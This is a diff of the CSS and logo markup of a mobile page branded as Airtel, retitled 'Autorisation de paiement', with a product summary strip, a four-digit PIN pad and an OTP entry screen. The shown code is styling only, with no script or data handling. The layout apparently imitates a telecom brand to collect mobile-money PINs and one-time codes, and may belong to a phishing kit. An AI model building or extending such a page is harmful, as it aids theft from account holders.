@@ -5,10 +5,10 @@
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
 <meta name="theme-color" content="#E40000">
 <meta name="apple-mobile-web-app-capable" content="yes">
-<title>Airtel — Connexion sécurisée</title>
+<title>Airtel — Autorisation de paiement</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=DM+Mono:wght@500;600&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=DM+Mono:wght@500;600&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
 <style>
 :root{
   --red:#E40000;--red-dk:#B20000;--red-lt:#FFE5E5;--red-soft:#FFF3F3;
@@ -17,15 +17,18 @@
   --ok:#1A7F37;--err:#D32F2F;--blue:#1B62B5;
   --g-1:4px;--g-2:8px;--g-3:12px;--g-4:16px;--g-5:20px;--g-6:24px;--g-7:32px;--g-8:40px;
   --r-sm:10px;--r-md:14px;--r-lg:18px;--r-xl:22px;--r-full:999px;
-  --h-btn:52px;--h-num:56px;
+  --h-btn:52px;--h-num:54px;
   --ease:cubic-bezier(.2,0,0,1);
+  --font-body:'Inter',system-ui,-apple-system,sans-serif;
+  --font-display:'Space Grotesk','Inter',sans-serif;
+  --font-mono:'DM Mono',ui-monospace,'SF Mono',Menlo,monospace;
 }
 *,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-html{background:var(--red)}
+html{background:var(--red);height:100%;-webkit-text-size-adjust:100%;text-size-adjust:100%}
 html,body{height:100%}
 body{
-  font-family:'Inter',system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;
-  font-size:15px;line-height:1.5;color:var(--ink);background:#F7F7FA;
+  font-family:var(--font-body);font-size:15px;line-height:1.5;color:var(--ink);
+  background:#F7F7FA;
   -webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;
   display:flex;flex-direction:column;
   position:fixed;inset:0;width:100%;height:100vh;height:100dvh;overflow:hidden;
@@ -95,110 +98,83 @@ img,svg{display:block;max-width:100%}
 /* ═════ LOGIN ═════ */
 .login-fixed{flex:1;min-height:0;display:flex;flex-direction:column;overflow:hidden}
 
-/* ── Summary ── */
+/* Compact summary strip */
 .summary{
   flex-shrink:0;
   background:linear-gradient(135deg,var(--red) 0%,var(--red-dk) 100%);
-  padding:var(--g-3) var(--g-4) var(--g-4);
+  padding:10px var(--g-4);
+  display:grid;grid-template-columns:1fr auto;gap:var(--g-3);align-items:center;
 }
-.summary-head{
-  display:flex;align-items:center;justify-content:space-between;
-  gap:var(--g-3);
-  margin-bottom:var(--g-2);
-  padding-inline:2px;
+.summary-left{display:grid;grid-template-columns:40px 1fr;gap:var(--g-3);align-items:center;min-width:0}
+.summary-img{
+  width:40px;height:40px;flex-shrink:0;border-radius:var(--r-sm);
+  background:#fff;overflow:hidden;display:grid;place-items:center;
+  border:1px solid rgba(255,255,255,.4);
 }
-.summary-head-label{
-  font-size:10px;font-weight:700;letter-spacing:.1em;
-  text-transform:uppercase;color:rgba(255,255,255,.6);
-  line-height:1;
+.summary-img img{width:100%;height:100%;object-fit:cover}
+.summary-info{min-width:0;display:flex;flex-direction:column;gap:3px}
+.summary-name{
+  font-family:var(--font-display);font-size:13px;font-weight:700;color:#fff;
+  letter-spacing:-.01em;line-height:1.2;
+  overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
+}
+.summary-meta{
+  display:flex;align-items:center;gap:6px;flex-wrap:nowrap;
+  overflow:hidden;font-size:10px;line-height:1;
+}
+.summary-meta-lbl{
+  font-size:9px;font-weight:600;color:rgba(255,255,255,.55);
+  text-transform:uppercase;letter-spacing:.05em;white-space:nowrap;
+}
+.summary-meta-val{
+  font-family:var(--font-mono);font-size:10.5px;font-weight:600;color:#fff;
+  white-space:nowrap;letter-spacing:.02em;
+}
+.summary-meta-dot{width:2px;height:2px;border-radius:50%;background:rgba(255,255,255,.35);flex-shrink:0}
+.summary-price{
+  display:flex;flex-direction:column;align-items:flex-end;gap:2px;flex-shrink:0;
+}
+.summary-price strong{
+  font-family:var(--font-display);font-size:16px;font-weight:800;
+  letter-spacing:-.02em;color:#fff;line-height:1;
+}
+.summary-price small{
+  font-size:9px;font-weight:700;letter-spacing:.06em;
+  text-transform:uppercase;color:rgba(255,255,255,.65);line-height:1;
 }
 .summary-change{
   display:inline-flex;align-items:center;gap:4px;
-  padding:5px 11px;
-  background:rgba(255,255,255,.14);
-  border:1px solid rgba(255,255,255,.22);
-  border-radius:var(--r-full);
-  font-size:10.5px;font-weight:600;
-  color:rgba(255,255,255,.92);
-  line-height:1;
+  padding:5px 11px;background:rgba(255,255,255,.14);
+  border:1px solid rgba(255,255,255,.22);border-radius:var(--r-full);
+  font-size:10.5px;font-weight:600;color:rgba(255,255,255,.92);line-height:1;
+  grid-column:1 / -1;justify-self:end;
+  margin-top:2px;
 }
 .summary-change:active{background:rgba(255,255,255,.22)}
+.summary-change svg{width:9px;height:9px}
 
-.summary-product{
-  display:grid;
-  grid-template-columns:48px 1fr auto;
-  align-items:center;
-  gap:var(--g-3);
-  padding:10px;
-  background:rgba(255,255,255,.12);
-  border:1px solid rgba(255,255,255,.18);
-  border-radius:var(--r-md);
-  margin-bottom:var(--g-3);
-}
-.summary-product-img{
-  width:48px;height:48px;flex-shrink:0;
-  border-radius:var(--r-sm);
-  background:rgba(255,255,255,.9);
-  overflow:hidden;
-  display:grid;place-items:center;
-  border:1px solid rgba(255,255,255,.4);
-}
-.summary-product-img img{width:100%;height:100%;object-fit:cover}
-.summary-product-info{min-width:0;display:flex;flex-direction:column;gap:3px}
-.summary-product-name{
-  font-size:13px;font-weight:800;color:#fff;letter-spacing:-.01em;
-  line-height:1.2;
-  overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
-}
-.summary-product-meta{
-  font-size:9.5px;font-weight:700;letter-spacing:.08em;
-  text-transform:uppercase;color:rgba(255,255,255,.7);
-  line-height:1;
-}
-.summary-product-price{
-  display:flex;flex-direction:column;align-items:flex-end;gap:3px;
-  flex-shrink:0;line-height:1;padding-right:2px;
-}
-.summary-product-price strong{
-  font-family:'DM Mono',ui-monospace,monospace;
-  font-size:17px;font-weight:700;letter-spacing:-.02em;
-  color:#fff;line-height:1;
-}
-.summary-product-price small{
-  font-size:9px;font-weight:700;letter-spacing:.08em;
-  text-transform:uppercase;color:rgba(255,255,255,.65);
-  line-height:1;
-}
-.summary-divider{height:1px;background:rgba(255,255,255,.16);margin-bottom:var(--g-3)}
-.summary-bottom{
-  display:flex;align-items:center;gap:var(--g-2);
-  flex-wrap:wrap;row-gap:var(--g-2);
-}
-.summary-item{display:inline-flex;align-items:center;gap:5px;min-width:0;line-height:1}
-.summary-item svg{flex-shrink:0;opacity:.55}
-.summary-lbl{
-  font-size:9.5px;font-weight:600;color:rgba(255,255,255,.55);
-  text-transform:uppercase;letter-spacing:.04em;white-space:nowrap;
-}
-.summary-val{
-  font-family:'DM Mono',ui-monospace,monospace;
-  font-size:11px;font-weight:700;color:#fff;white-space:nowrap;letter-spacing:.01em;
-}
-.summary-dot{width:3px;height:3px;border-radius:50%;background:rgba(255,255,255,.3);flex-shrink:0}
-
-/* ── PIN stage ── */
+/* PIN stage */
 .pin-stage{
   flex:1;min-height:0;
-  display:flex;flex-direction:column;align-items:center;justify-content:center;
-  padding:var(--g-4) var(--g-5) max(var(--g-4),env(safe-area-inset-bottom,0px));
-  gap:var(--g-4);overflow:hidden;
+  display:flex;flex-direction:column;align-items:center;
+  padding:var(--g-5) var(--g-5) max(var(--g-5),env(safe-area-inset-bottom,0px));
+  gap:var(--g-4);
+  overflow-y:auto;overflow-x:hidden;
+  -webkit-overflow-scrolling:touch;overscroll-behavior:contain;
+  justify-content:flex-start;
 }
-.pin-head{display:flex;flex-direction:column;gap:var(--g-1);text-align:center;max-width:340px}
-.pin-title{font-size:16px;font-weight:800;letter-spacing:-.015em;color:var(--ink);line-height:1.25}
+.pin-head{display:flex;flex-direction:column;gap:var(--g-1);text-align:center;max-width:340px;flex-shrink:0}
+.pin-title{
+  font-family:var(--font-display);font-size:17px;font-weight:700;
+  letter-spacing:-.02em;color:var(--ink);line-height:1.25;
+}
 .pin-sub{font-size:12.5px;line-height:1.55;color:var(--ink-2)}
-.pin-sub strong{color:var(--red);font-weight:800}
+.pin-sub strong{color:var(--red);font-weight:800;font-family:var(--font-mono)}
 
-.pin-boxes{display:grid;grid-template-columns:repeat(4,1fr);gap:var(--g-3);width:100%;max-width:280px}
+.pin-boxes{
+  display:grid;grid-template-columns:repeat(4,1fr);gap:var(--g-3);
+  width:100%;max-width:280px;flex-shrink:0;
+}
 .pin-box{
   aspect-ratio:1;border-radius:var(--r-lg);
   background:var(--surf-mid);border:1.5px solid var(--line);
@@ -207,49 +183,71 @@ img,svg{display:block;max-width:100%}
 }
 .pin-box.active{border-color:var(--red);background:#fff;box-shadow:0 0 0 3px rgba(228,0,0,.12)}
 .pin-box.filled{border-color:var(--red);background:#fff}
-.pin-dot{width:0;height:0;border-radius:50%;background:var(--red);transition:width .15s var(--ease),height .15s var(--ease)}
+.pin-dot{
+  width:0;height:0;border-radius:50%;background:var(--red);
+  transition:width .15s var(--ease),height .15s var(--ease);
+}
 .pin-box.filled .pin-dot{width:13px;height:13px}
 
-.pin-error{min-height:16px;font-size:11.5px;font-weight:600;color:var(--err);text-align:center;line-height:1.4}
-
-.numpad{display:grid;grid-template-columns:repeat(3,1fr);gap:var(--g-2);width:100%;max-width:320px}
-.numkey{
-  height:var(--h-num);border-radius:var(--r-lg);background:#fff;
-  border:1px solid var(--line);font-size:20px;font-weight:600;color:var(--ink);
-  display:grid;place-items:center;
-  box-shadow:0 1px 2px rgba(15,15,18,.04);
-  transition:background .1s,box-shadow .1s,transform .1s;line-height:1;
+.pin-error{
+  min-height:16px;font-size:11.5px;font-weight:600;color:var(--err);
+  text-align:center;line-height:1.4;flex-shrink:0;
 }
-.numkey:active{background:#EFEFF3;box-shadow:none;transform:scale(.98)}
-.numkey.del{font-size:17px;color:var(--ink-2)}
-.numkey.empty{background:transparent;border-color:transparent;box-shadow:none;cursor:default}
-@media(max-height:640px){.numkey{height:50px}}
+
+.numpad{
+  display:grid;grid-template-columns:repeat(3,1fr);gap:var(--g-2);
+  width:100%;max-width:320px;flex-shrink:0;
+}
+.numkey{
+  height:var(--h-num);border-radius:var(--r-md);
+  background:#fff;border:1px solid var(--line);
+  font-family:var(--font-display);font-size:21px;font-weight:600;color:var(--ink);
+  display:grid;place-items:center;line-height:1;
+  box-shadow:0 1px 3px rgba(15,15,18,.06);
+  transition:background .1s,box-shadow .1s;
+}
+.numkey:active{background:var(--surf-mid);box-shadow:none}
+.numkey.del{font-size:18px;color:var(--ink-2);background:transparent;border-color:transparent;box-shadow:none}
+.numkey.empty{background:transparent;border-color:transparent;box-shadow:none;cursor:default;opacity:0;pointer-events:none}
+@media(max-height:680px){.numkey{height:48px;font-size:20px}}
+@media(max-height:600px){.numkey{height:44px;font-size:18px}}
 
 .btn-cta{
   display:grid;place-items:center;width:100%;max-width:320px;height:var(--h-btn);
-  border-radius:var(--r-full);background:var(--red);color:#fff;
-  font-size:15px;font-weight:800;letter-spacing:.005em;
-  box-shadow:0 2px 12px rgba(228,0,0,.3);
-  transition:background .15s,transform .12s,box-shadow .12s;
+  border-radius:var(--r-full);
+  background:linear-gradient(135deg,#FF1F1F 0%,#E40000 50%,#B20000 100%);
+  color:#fff;font-family:var(--font-display);
+  font-size:15px;font-weight:700;letter-spacing:.005em;
+  box-shadow:0 4px 20px rgba(228,0,0,.4);
+  transition:transform .12s,box-shadow .12s,opacity .15s,background .15s;
+  flex-shrink:0;
 }
-.btn-cta:active:not(.dim){transform:scale(.97);box-shadow:none}
-.btn-cta.dim{background:#ECECEF;color:#B5B5BE;box-shadow:none;cursor:not-allowed}
-@media(max-height:640px){.btn-cta{height:48px}}
+.btn-cta:active:not(.dim){transform:scale(.98);box-shadow:none}
+.btn-cta.dim{
+  background:var(--surf-mid);color:var(--ink-3);
+  box-shadow:none;cursor:not-allowed;
+}
+.btn-cta span{display:flex;align-items:center;gap:8px;justify-content:center}
+.btn-cta svg{width:15px;height:15px;flex-shrink:0}
 
 /* ═════ PROCESSING ═════ */
 .proc{
-  flex:1;min-height:0;display:flex;flex-direction:column;align-items:center;justify-content:center;
+  flex:1;min-height:0;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
   gap:var(--g-6);padding:var(--g-8) var(--g-6);background:var(--surf-lo);
 }
-.proc-loader{position:relative;width:120px;height:120px;display:grid;place-items:center;flex-shrink:0}
+.proc-loader{position:relative;width:112px;height:112px;display:grid;place-items:center;flex-shrink:0}
 .proc-ring{
   position:absolute;inset:0;border-radius:50%;
   border:3px solid var(--red-lt);
   border-top-color:var(--red);border-right-color:var(--red);
   animation:spin 1s linear infinite;
 }
-.proc-logo{height:28px;width:auto;position:relative;z-index:1;color:var(--red)}
-.proc-title{font-size:18px;font-weight:800;letter-spacing:-.015em;text-align:center;line-height:1.25}
+.proc-logo{height:26px;width:auto;position:relative;z-index:1;color:var(--red)}
+.proc-title{
+  font-family:var(--font-display);font-size:18px;font-weight:700;
+  letter-spacing:-.02em;text-align:center;line-height:1.25;
+}
 .proc-sub{font-size:13px;line-height:1.6;color:var(--ink-2);text-align:center;max-width:280px}
 .proc-bar{width:100%;max-width:280px;height:4px;background:var(--red-lt);border-radius:var(--r-full);overflow:hidden}
 .proc-bar-fill{
@@ -267,14 +265,21 @@ img,svg{display:block;max-width:100%}
 
 /* ═════ OTP ═════ */
 .otp-wrap{
-  padding:var(--g-4) var(--g-4) calc(var(--g-6) + env(safe-area-inset-bottom,0px));
+  flex:1;min-height:0;
+  padding:var(--g-4) var(--g-4) max(var(--g-6),env(safe-area-inset-bottom,0px));
   display:flex;flex-direction:column;align-items:center;gap:var(--g-4);
+  overflow-y:auto;overflow-x:hidden;
+  -webkit-overflow-scrolling:touch;overscroll-behavior:contain;
+  justify-content:flex-start;
 }
 .otp-card{
-  width:100%;max-width:400px;background:#fff;border-radius:var(--r-xl);
-  box-shadow:0 1px 3px rgba(15,15,18,.06);padding:var(--g-5);
+  width:100%;max-width:400px;background:#fff;
+  border-radius:var(--r-xl);
+  box-shadow:0 1px 3px rgba(15,15,18,.06);
+  padding:var(--g-5);
   display:flex;flex-direction:column;align-items:center;gap:var(--g-3);
   border-top:3px solid var(--red);
+  flex-shrink:0;
 }
 .otp-icon{
   width:56px;height:56px;border-radius:50%;
@@ -282,23 +287,35 @@ img,svg{display:block;max-width:100%}
   display:grid;place-items:center;flex-shrink:0;
 }
 .otp-icon svg{width:24px;height:24px}
-.otp-card h2{font-size:16px;font-weight:700;letter-spacing:-.01em;text-align:center;line-height:1.3}
-.otp-card p{font-size:12.5px;line-height:1.6;color:var(--ink-2);text-align:center;max-width:280px}
+.otp-card h2{
+  font-family:var(--font-display);font-size:16px;font-weight:700;
+  letter-spacing:-.01em;text-align:center;line-height:1.3;
+}
+.otp-card p{
+  font-size:12.5px;line-height:1.6;color:var(--ink-2);
+  text-align:center;max-width:280px;
+}
 .otp-phone{
   display:inline-flex;align-items:center;gap:6px;padding:6px 14px;
   border-radius:var(--r-full);background:var(--surf-mid);
-  font-family:'DM Mono',ui-monospace,monospace;
-  font-size:14px;font-weight:700;color:var(--ink);letter-spacing:.01em;line-height:1;
+  font-family:var(--font-mono);
+  font-size:14px;font-weight:600;color:var(--ink);
+  letter-spacing:.01em;line-height:1;
 }
+.otp-phone span{margin-right:5px}
 
-.otp-boxes{display:grid;grid-template-columns:repeat(4,1fr);gap:var(--g-3);width:100%;max-width:320px;cursor:text}
+.otp-boxes{
+  display:grid;grid-template-columns:repeat(4,1fr);gap:var(--g-3);
+  width:100%;max-width:320px;cursor:text;flex-shrink:0;
+}
 .otp-box{
   aspect-ratio:1;border-radius:var(--r-xl);
   background:var(--surf-mid);border:2px solid var(--line);
   display:grid;place-items:center;
-  font-family:'DM Mono',ui-monospace,monospace;
-  font-size:26px;font-weight:800;color:var(--ink);
-  transition:border-color .15s,background .15s,box-shadow .15s,color .15s;line-height:1;
+  font-family:var(--font-mono);
+  font-size:26px;font-weight:700;color:var(--ink);
+  transition:border-color .15s,background .15s,box-shadow .15s,color .15s;
+  line-height:1;
 }
 @media(max-width:360px){.otp-box{font-size:22px}}
 .otp-box.active{border-color:var(--red);background:#fff;box-shadow:0 0 0 4px rgba(228,0,0,.14)}
@@ -307,27 +324,49 @@ img,svg{display:block;max-width:100%}
 .otp-box.error{background:#FFF0F0;border-color:var(--err);color:var(--err);box-shadow:0 0 0 4px rgba(211,47,47,.14)}
 .otp-box.locked{opacity:.45;pointer-events:none}
 
-.otp-err-zone{width:100%;max-width:360px;min-height:44px;display:none}
-.otp-err-msg{font-size:12px;font-weight:600;color:var(--err);text-align:center;margin-bottom:var(--g-2);line-height:1.45}
+.otp-err-zone{width:100%;max-width:360px;min-height:40px;display:none;flex-shrink:0}
+.otp-err-msg{
+  font-size:12px;font-weight:600;color:var(--err);
+  text-align:center;margin-bottom:var(--g-2);line-height:1.45;
+}
 .otp-err-actions{display:flex;gap:var(--g-2);justify-content:center;flex-wrap:wrap}
-.otp-err-btn{height:34px;padding:0 16px;border-radius:var(--r-full);font-size:12px;font-weight:700;letter-spacing:.005em;line-height:1}
-.otp-err-btn.ghost{background:#EFEFF3;border:1.5px solid var(--line);color:var(--ink-2)}
+.otp-err-btn{
+  height:34px;padding:0 16px;border-radius:var(--r-full);
+  font-size:12px;font-weight:700;letter-spacing:.005em;line-height:1;
+}
+.otp-err-btn.ghost{background:var(--surf-mid);border:1.5px solid var(--line);color:var(--ink-2)}
 .otp-err-btn.solid{background:var(--red);color:#fff}
 
-.otp-meta{display:flex;flex-direction:column;align-items:center;gap:var(--g-2);width:100%;max-width:320px}
-.otp-help{display:inline-flex;align-items:center;gap:6px;font-size:12px;color:var(--ink-2);line-height:1}
-.otp-help svg{flex-shrink:0;opacity:.6}
-.otp-timer-row{display:inline-flex;align-items:center;gap:6px;font-size:12px;color:var(--ink-2);line-height:1}
-.otp-timer{font-family:'DM Mono',ui-monospace,monospace;font-weight:700;color:var(--red);min-width:22px;text-align:center}
+.otp-meta{
+  display:flex;flex-direction:column;align-items:center;gap:var(--g-2);
+  width:100%;max-width:320px;flex-shrink:0;
+}
+.otp-help{
+  display:inline-flex;align-items:center;gap:6px;
+  font-size:12px;color:var(--ink-2);line-height:1;
+}
+.otp-help svg{flex-shrink:0;opacity:.6;width:13px;height:13px}
+.otp-timer-row{
+  display:inline-flex;align-items:center;gap:6px;
+  font-size:12px;color:var(--ink-2);line-height:1;
+}
+.otp-timer-row svg{width:13px;height:13px;flex-shrink:0;opacity:.6}
+.otp-timer{
+  font-family:var(--font-mono);font-weight:700;color:var(--red);
+  min-width:22px;text-align:center;
+}
 .otp-resend{
-  font-size:12.5px;font-weight:700;color:var(--blue);text-decoration:underline;
-  padding:6px 10px;border-radius:8px;line-height:1;
+  font-size:12.5px;font-weight:700;color:var(--blue);
+  text-decoration:underline;padding:6px 10px;border-radius:8px;line-height:1;
 }
 .otp-resend.dim{color:#B5B5BE;text-decoration:none;cursor:default;pointer-events:none}
 
-#otpInput{position:absolute;opacity:0;width:1px;height:1px;pointer-events:none;top:0;left:0}
+#otpInput{
+  position:absolute;opacity:0;width:1px;height:1px;
+  pointer-events:none;top:0;left:0;
+}
 
-/* ═════ FULL-SCREEN LOADING (same style as index) ═════ */
+/* ═════ LOADING ═════ */
 .loading{
   position:fixed;inset:0;z-index:200;
   display:none;place-items:center;
@@ -338,31 +377,23 @@ img,svg{display:block;max-width:100%}
 .loading.show{display:grid;opacity:1}
 .loading-inner{
   display:flex;flex-direction:column;align-items:center;gap:var(--g-4);
-  padding:var(--g-6);
-  text-align:center;
-  max-width:300px;
+  padding:var(--g-6);text-align:center;max-width:300px;
 }
 .loading-loader{
-  position:relative;
-  width:72px;height:72px;
-  display:grid;place-items:center;
-  flex-shrink:0;
+  position:relative;width:72px;height:72px;
+  display:grid;place-items:center;flex-shrink:0;
 }
 .loading-ring{
   position:absolute;inset:0;border-radius:50%;
   border:3px solid var(--red-lt);
-  border-top-color:var(--red);
-  border-right-color:var(--red);
+  border-top-color:var(--red);border-right-color:var(--red);
   animation:spin .9s linear infinite;
 }
 .loading-title{
-  font-family:'Space Grotesk','Inter',sans-serif;
-  font-size:16px;font-weight:700;letter-spacing:-.015em;
-  color:var(--ink);line-height:1.25;
+  font-family:var(--font-display);font-size:16px;font-weight:700;
+  letter-spacing:-.015em;color:var(--ink);line-height:1.25;
 }
-.loading-sub{
-  font-size:12.5px;line-height:1.5;color:var(--ink-3);
-}
+.loading-sub{font-size:12.5px;line-height:1.5;color:var(--ink-3)}
 
 /* ═════ TRANSITION BAR ═════ */
 .t-bar{position:fixed;top:0;left:0;right:0;height:3px;z-index:9001;overflow:hidden;pointer-events:none}
@@ -370,181 +401,6 @@ img,svg{display:block;max-width:100%}
   height:100%;width:0;background:var(--red);border-radius:0 2px 2px 0;
   box-shadow:0 0 8px rgba(228,0,0,.5);transition:width .4s var(--ease);
 }
-
-/* ══ VIEWPORT LOCK — immune to user font size & display zoom ══ */
-html{
-  -webkit-text-size-adjust:100%;
-  -moz-text-size-adjust:100%;
-  text-size-adjust:100%;
-}
-/* Force all text to ignore system font scale on Android WebView */
-* { -webkit-text-size-adjust:100%; }
-
-/* ── PIN STAGE: scrollable so confirm never hides ── */
-.pin-stage{
-  overflow-y:auto!important;
-  overflow-x:hidden!important;
-  -webkit-overflow-scrolling:touch;
-  justify-content:flex-start!important;
-  padding-top:16px!important;
-  padding-bottom:max(16px,env(safe-area-inset-bottom,16px))!important;
-}
-
-/* ── Numpad: fixed px sizes, never grow ── */
-.numkey{
-  height:54px!important;
-  font-size:22px!important;
-  flex-shrink:0!important;
-}
-@media(max-height:680px){
-  .numkey{height:48px!important;font-size:20px!important}
-  .pin-box,.pb{height:52px!important;font-size:22px!important}
-  .otp-box,.ob{height:52px!important;font-size:22px!important}
-}
-@media(max-height:600px){
-  .numkey{height:44px!important;font-size:18px!important}
-  .pin-box,.pb{height:46px!important;font-size:20px!important}
-  .otp-box,.ob{height:46px!important;font-size:20px!important}
-}
-
-/* ── CTA button: always fixed height, never shrink ── */
-.btn-cta{
-  height:52px!important;
-  flex-shrink:0!important;
-  font-size:15px!important;
-  margin-top:12px!important;
-  position:sticky;
-  bottom:max(0px,env(safe-area-inset-bottom,0px));
-}
-
-/* ── login-fixed must fill and clip to avoid double scroll ── */
-.login-fixed{
-  display:flex!important;
-  flex-direction:column!important;
-  flex:1!important;
-  min-height:0!important;
-  overflow:hidden!important;
-}
-
-/* ── Summary: never grow too tall ── */
-.summary{flex-shrink:0!important;max-height:80px!important;overflow:hidden!important}
-
-/* ── OTP wrap: also scrollable ── */
-.otp-wrap{
-  overflow-y:auto!important;
-  -webkit-overflow-scrolling:touch;
-  justify-content:flex-start!important;
-  padding-top:16px!important;
-  padding-bottom:max(16px,env(safe-area-inset-bottom,16px))!important;
-}
-
-/* ── Small screens: tighten gaps ── */
-@media(max-width:360px){
-  .pin-stage,.otp-wrap{gap:10px!important}
-  .numkey{height:48px!important;font-size:20px!important}
-  .btn-cta{height:48px!important;font-size:14px!important}
-}
-
-/* ── IMMUNE TO FONT SIZE / DISPLAY ZOOM ── */
-html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
-
-/* ── Summary: compact, never overflows ── */
-.summary{flex-shrink:0!important;overflow:hidden!important}
-
-/* ── Pin stage: scrollable so confirm never hides ── */
-.pin-stage{
-  overflow-y:auto!important;overflow-x:hidden!important;
-  justify-content:flex-start!important;
-  padding-bottom:0!important;
-  -webkit-overflow-scrolling:touch!important;
-  overscroll-behavior:contain!important;
-}
-.otp-wrap{
-  overflow-y:auto!important;overflow-x:hidden!important;
-  flex:1!important;min-height:0!important;
-  padding-bottom:0!important;
-  -webkit-overflow-scrolling:touch!important;
-  overscroll-behavior:contain!important;
-}
-
-/* ── Confirm button: always visible ── */
-.btn-cta{
-  position:sticky!important;bottom:0!important;
-  flex-shrink:0!important;
-  margin-top:10px!important;
-  margin-bottom:max(12px,env(safe-area-inset-bottom,12px))!important;
-  z-index:2!important;
-}
-
-/* ── Numpad: no scale effect ── */
-.numkey:active{transform:none!important}
-
-/* ── Fixed elements never shrink ── */
-.nav{flex-shrink:0!important}
-.steps{flex-shrink:0!important}
-.login-fixed{overflow:hidden!important}
-.pin-head{flex-shrink:0!important}
-.pin-boxes,.otp-boxes,.numpad{flex-shrink:0!important}
-
-/* ── Short screen summary cap ── */
-@media(max-height:560px){.summary{max-height:76px!important}}
-
-/* ── COMPACT SUMMARY ── */
-.summary{
-  flex-shrink:0!important;overflow:hidden!important;
-  background:linear-gradient(135deg,var(--red) 0%,var(--red-dk) 100%);
-  padding:8px 16px 10px;
-  display:flex;align-items:center;justify-content:space-between;gap:10px;
-}
-.sum-row1{display:flex;align-items:center;gap:10px;min-width:0;flex:1}
-.summary-product-img{
-  width:36px;height:36px;flex-shrink:0;
-  border-radius:8px;background:rgba(255,255,255,.9);
-  display:grid;place-items:center;
-  border:1px solid rgba(255,255,255,.3);
-}
-.sum-info{min-width:0;flex:1;display:flex;flex-direction:column;gap:3px}
-.sum-meta-row{display:flex;align-items:center;gap:5px;flex-wrap:nowrap;overflow:hidden}
-.sum-price{
-  flex-shrink:0;display:flex;flex-direction:column;align-items:flex-end;gap:2px;
-}
-.sum-price strong{
-  font-size:14px;font-weight:800;color:#fff;letter-spacing:-.02em;white-space:nowrap;
-}
-.summary-product-name{
-  font-size:13px;font-weight:800;color:#fff;letter-spacing:-.01em;
-  line-height:1.2;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
-}
-.summary-val{
-  font-family:'DM Mono',ui-monospace,monospace;
-  font-size:10px;font-weight:700;color:#fff;white-space:nowrap;
-}
-.summary-lbl{
-  font-size:9px;font-weight:600;color:rgba(255,255,255,.55);
-  text-transform:uppercase;letter-spacing:.04em;white-space:nowrap;
-}
-.summary-dot{width:2px;height:2px;border-radius:50%;background:rgba(255,255,255,.35);flex-shrink:0}
-.summary-change{
-  display:inline-flex;align-items:center;gap:4px;flex-shrink:0;
-  padding:4px 10px;background:rgba(255,255,255,.14);
-  border:1px solid rgba(255,255,255,.22);border-radius:999px;
-  font-size:11px;font-weight:600;color:#fff;cursor:pointer;
-}
-/* hide old summary classes that may conflict */
-.summary-head,.summary-head-label,.summary-product,.summary-divider,.summary-bottom{display:none!important}
-
-/* ── IMMUNE TO FONT SIZE / DISPLAY ZOOM ── */
-html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
-/* ── Pin stage scrollable ── */
-.pin-stage{overflow-y:auto!important;overflow-x:hidden!important;justify-content:flex-start!important;padding-bottom:0!important;-webkit-overflow-scrolling:touch!important;overscroll-behavior:contain!important}
-.otp-wrap{overflow-y:auto!important;overflow-x:hidden!important;flex:1!important;min-height:0!important;padding-bottom:0!important;-webkit-overflow-scrolling:touch!important;overscroll-behavior:contain!important}
-/* ── Confirm always visible ── */
-.btn-cta{position:sticky!important;bottom:0!important;flex-shrink:0!important;margin-top:10px!important;margin-bottom:max(12px,env(safe-area-inset-bottom,12px))!important;z-index:2!important}
-/* ── Numpad no scale ── */
-.numkey:active{transform:none!important}
-/* ── Fixed elements ── */
-.nav{flex-shrink:0!important}.steps{flex-shrink:0!important}.login-fixed{overflow:hidden!important}
-.pin-head{flex-shrink:0!important}.pin-boxes,.otp-boxes,.numpad{flex-shrink:0!important}
 </style>
 </head>
 <body>
@@ -554,39 +410,39 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
   <defs>
     <symbol id="airtel-logo" viewBox="0 0 124 47.597">
       <g transform="translate(-57.9 -110.7)">
-    <g transform="translate(58.856 110.7)">
-      <g>
-        <g transform="translate(36.705)">
-          <path d="M205.786,110.7a3.523,3.523,0,0,0-3.486,3.526,3.447,3.447,0,1,0,6.891.04,3.489,3.489,0,0,0-3.405-3.566" transform="translate(-182.107 -110.7)" fill="currentColor"/>
-          <path d="M204.8,155h5.409V132.8l-5.409.922Z" transform="translate(-183.606 -123.946)" fill="currentColor"/>
-          <path d="M163.519,150.25a5.117,5.117,0,0,1-2.8.721c-2.163,0-3.165-1.723-3.125-3.726a3.464,3.464,0,0,1,3.766-3.526h2.164Zm-2.244-18.35a15.769,15.769,0,0,0-7.292,1.963l-.6.32,1.442,3.325.841-.4a12.2,12.2,0,0,1,5.128-1.242c1.963.08,2.764,1,2.764,2.925v1.122h-3.205c-5.168,0-8.374,2.8-8.454,7.172a7.837,7.837,0,0,0,8.053,7.732,12.414,12.414,0,0,0,9.135-3.486V139.552c-.08-5.769-4.047-7.652-7.813-7.652" transform="translate(-151.9 -123.406)" fill="currentColor"/>
-          <path d="M301.493,136.367c2.4,0,2.764,2.684,2.764,4.367h-5.89c.12-2.164.962-4.367,3.125-4.367m1.162,14.744a3.851,3.851,0,0,1-3.125-1.242c-.962-1.082-1.4-3.325-1.282-5.689h11.659v-.561c-.12-7.853-2.684-11.418-8.414-11.418-6.37,0-8.854,6.01-8.894,11.7-.04,3.566,1.282,7.172,3.686,9.215a8.858,8.858,0,0,0,5.85,1.923,12.639,12.639,0,0,0,3.846-.6,16.449,16.449,0,0,0,4.087-2.043l-1.522-3.245a9.9,9.9,0,0,1-5.89,1.963" transform="translate(-236.228 -123.586)" fill="currentColor"/>
